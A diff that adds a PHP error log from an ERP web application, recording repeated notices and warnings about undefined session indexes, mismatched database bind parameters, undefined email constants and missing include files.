@@ -1,0 +1,426 @@
+[04-Jan-2023 14:29:34 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:29:36 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:29:37 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:29:55 Asia/Kolkata] PHP Notice:  Undefined index: txt_dateFrom in /var/www/html/erpm/View/message-popup.php on line 27
+[04-Jan-2023 14:29:55 Asia/Kolkata] PHP Notice:  Undefined index: txt_dateto in /var/www/html/erpm/View/message-popup.php on line 34
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 470
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_HOST - assumed 'EMAIL_HOST' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 473
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_AUTH - assumed 'EMAIL_AUTH' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 474
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_USER - assumed 'EMAIL_USER' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 475
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PASS - assumed 'EMAIL_PASS' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 476
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_SMTPSecure - assumed 'EMAIL_SMTPSecure' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 477
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PORT - assumed 'EMAIL_PORT' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 478
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_FROM - assumed 'EMAIL_FROM' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 479
+[04-Jan-2023 14:33:30 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 482
+[04-Jan-2023 14:33:32 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:33:39 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:33:41 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:33:42 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:33:55 Asia/Kolkata] PHP Notice:  Undefined index: txt_dateFrom in /var/www/html/erpm/View/message-popup.php on line 27
+[04-Jan-2023 14:33:55 Asia/Kolkata] PHP Notice:  Undefined index: txt_dateto in /var/www/html/erpm/View/message-popup.php on line 34
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 470
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_HOST - assumed 'EMAIL_HOST' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 473
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_AUTH - assumed 'EMAIL_AUTH' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 474
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_USER - assumed 'EMAIL_USER' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 475
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PASS - assumed 'EMAIL_PASS' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 476
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_SMTPSecure - assumed 'EMAIL_SMTPSecure' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 477
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PORT - assumed 'EMAIL_PORT' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 478
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_FROM - assumed 'EMAIL_FROM' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 479
+[04-Jan-2023 14:34:08 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 482
+[04-Jan-2023 14:34:09 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:34:32 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:35:10 Asia/Kolkata] PHP Notice:  Undefined index: emp_status in /var/www/html/erpm/View/rpt_DownTime_for_it.php on line 94
+[04-Jan-2023 14:35:10 Asia/Kolkata] PHP Notice:  Undefined index: emp_status in /var/www/html/erpm/View/rpt_DownTime_for_it.php on line 98
+[04-Jan-2023 14:37:53 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 470
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_HOST - assumed 'EMAIL_HOST' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 473
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_AUTH - assumed 'EMAIL_AUTH' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 474
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_USER - assumed 'EMAIL_USER' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 475
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PASS - assumed 'EMAIL_PASS' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 476
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_SMTPSecure - assumed 'EMAIL_SMTPSecure' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 477
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PORT - assumed 'EMAIL_PORT' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 478
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_FROM - assumed 'EMAIL_FROM' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 479
+[04-Jan-2023 14:38:00 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 482
+[04-Jan-2023 14:38:02 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:38:42 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:39:32 Asia/Kolkata] PHP Warning:  count(): Parameter must be an array or an object that implements Countable in /var/www/html/erpm/View/ref_registration.php on line 300
+[04-Jan-2023 14:39:32 Asia/Kolkata] PHP Warning:  count(): Parameter must be an array or an object that implements Countable in /var/www/html/erpm/View/ref_registration.php on line 322
+[04-Jan-2023 14:40:08 Asia/Kolkata] PHP Warning:  count(): Parameter must be an array or an object that implements Countable in /var/www/html/erpm/View/ref_registration.php on line 300
+[04-Jan-2023 14:40:08 Asia/Kolkata] PHP Warning:  count(): Parameter must be an array or an object that implements Countable in /var/www/html/erpm/View/ref_registration.php on line 322
+[04-Jan-2023 14:40:18 Asia/Kolkata] PHP Notice:  Undefined index: txt_dateFrom in /var/www/html/erpm/View/message-popup.php on line 27
+[04-Jan-2023 14:40:18 Asia/Kolkata] PHP Notice:  Undefined index: txt_dateto in /var/www/html/erpm/View/message-popup.php on line 34
+[04-Jan-2023 14:40:27 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:40:47 Asia/Kolkata] PHP Warning:  include_once(../Services/sendsms_API1.php): failed to open stream: No such file or directory in /var/www/html/erpm/View/ALsendOnEmail.php on line 12
+[04-Jan-2023 14:40:47 Asia/Kolkata] PHP Warning:  include_once(): Failed opening '../Services/sendsms_API1.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/erpm/View/ALsendOnEmail.php on line 12
+[04-Jan-2023 14:41:24 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:43:28 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:43:30 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:43:32 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:44:18 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 470
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_HOST - assumed 'EMAIL_HOST' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 473
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_AUTH - assumed 'EMAIL_AUTH' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 474
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_USER - assumed 'EMAIL_USER' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 475
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PASS - assumed 'EMAIL_PASS' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 476
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_SMTPSecure - assumed 'EMAIL_SMTPSecure' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 477
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_PORT - assumed 'EMAIL_PORT' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 478
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMAIL_FROM - assumed 'EMAIL_FROM' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 479
+[04-Jan-2023 14:47:28 Asia/Kolkata] PHP Warning:  Use of undefined constant EMS_CenterName - assumed 'EMS_CenterName' (this will throw an Error in a future version of PHP) in /var/www/html/erpm/Controller/ConLog.php on line 482
+[04-Jan-2023 14:47:30 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:47:40 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:47:46 Asia/Kolkata] PHP Notice:  Undefined variable: emp_mail in /var/www/html/erpm/View/employee_serach.php on line 347
+[04-Jan-2023 14:48:08 Asia/Kolkata] PHP Notice:  Undefined variable: emp_mail in /var/www/html/erpm/View/employee_serach.php on line 347
+[04-Jan-2023 14:48:10 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:48:14 Asia/Kolkata] PHP Notice:  Undefined index: emp_status in /var/www/html/erpm/View/rpt_DownTime_for_it.php on line 94
+[04-Jan-2023 14:48:14 Asia/Kolkata] PHP Notice:  Undefined index: emp_status in /var/www/html/erpm/View/rpt_DownTime_for_it.php on line 98
+[04-Jan-2023 14:48:16 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:48:19 Asia/Kolkata] PHP Notice:  Undefined variable: emp_mail in /var/www/html/erpm/View/employee_serach.php on line 347
+[04-Jan-2023 14:48:23 Asia/Kolkata] PHP Notice:  Undefined variable: emp_mail in /var/www/html/erpm/View/employee_serach.php on line 347
+[04-Jan-2023 14:53:18 Asia/Kolkata] PHP Warning:  mysqli_stmt::bind_param(): Number of elements in type definition string doesn't match number of bind variables in /var/www/html/erpm/Controller/ConLog.php on line 464
+[04-Jan-2023 14:53:18 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:53:31 Asia/Kolkata] PHP Warning:  include_once(../Services/sendsms_API1.php): failed to open stream: No such file or directory in /var/www/html/erpm/View/ALsendOnEmail.php on line 12
+[04-Jan-2023 14:53:31 Asia/Kolkata] PHP Warning:  include_once(): Failed opening '../Services/sendsms_API1.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/erpm/View/ALsendOnEmail.php on line 12
+[04-Jan-2023 14:53:57 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:53:57 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:53:59 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:53:59 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:53:59 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:54:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:54:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
+[04-Jan-2023 14:54:04 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type null in /var/www/html/erpm/View/index.php on line 346
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:05 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/View/pkt.php on line 51
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __location in /var/www/html/erpm/View/pkt.php on line 53
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_refrance in /var/www/html/erpm/View/pkt.php on line 73
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:07 Asia/Kolkata] PHP Notice:  Undefined index: empid in /var/www/html/erpm/View/EmployeInfo.php on line 13
+[04-Jan-2023 14:54:07 Asia/Kolkata] PHP Notice:  Undefined variable: locationdir in /var/www/html/erpm/View/EmployeInfo.php on line 160
+[04-Jan-2023 14:54:07 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type int in /var/www/html/erpm/View/EmployeInfo.php on line 879
+[04-Jan-2023 14:54:07 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type int in /var/www/html/erpm/View/EmployeInfo.php on line 879
+[04-Jan-2023 14:54:07 Asia/Kolkata] PHP Notice:  Trying to access array offset on value of type int in /var/www/html/erpm/View/EmployeInfo.php on line 879
+[04-Jan-2023 14:54:57 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
+[04-Jan-2023 14:54:57 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:54:57 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:54:57 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:54:57 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:54:57 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:54:57 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/View/pkt.php on line 51
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __location in /var/www/html/erpm/View/pkt.php on line 53
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_refrance in /var/www/html/erpm/View/pkt.php on line 73
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
